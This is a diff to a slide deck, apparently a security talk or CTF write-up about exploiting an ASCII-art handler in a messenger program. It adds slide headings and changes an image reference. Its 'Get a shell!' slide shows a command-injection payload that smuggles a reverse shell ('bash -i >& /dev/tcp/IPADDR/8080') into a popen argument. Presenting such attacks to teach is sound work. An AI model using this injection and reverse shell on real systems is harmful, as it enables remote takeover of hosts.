@@ -168,7 +168,7 @@ void OnionMessenger::HandleAArt(Message::ImgLayer *msg) {
 ---
 
 ## Exploit Scenario
-
+@[HandShake]()
 ---?image=assets/image/process1.png&size=60%
 <!-- .slide: data-background-transition="none" -->
 ---?image=assets/image/process2.png&size=60%
@@ -181,11 +181,12 @@ void OnionMessenger::HandleAArt(Message::ImgLayer *msg) {
 <!-- .slide: data-background-transition="none" -->
 ---?image=assets/image/process6.png&size=60%
 <!-- .slide: data-background-transition="none" -->
----?image=assets/image/process2.png&size=60%
+---?image=assets/image/process3.png&size=60%
 <!-- .slide: data-background-transition="none" -->
 
 ---
 
+## Control GetPath
 ```C++
     } else {		// Cache Hit                                                               
         provider->PushChat(sender, "\n" + \
@@ -224,7 +225,9 @@ string Asciiart(const char *filepath) {
 ### Get a shell!
 
 ```C++
-popen(“/root/bin/goasciiart –p ;echo \"bash -i >& /dev/tcp/IPADDR/8080 0>&1\"  | bash;–w 80”);
+popen("/root/bin/goasciiart –p \
+    ;echo \"bash -i >& /dev/tcp/IPADDR/8080 0>&1\"  | bash;\
+    –w 80");
 ```
 
 ---
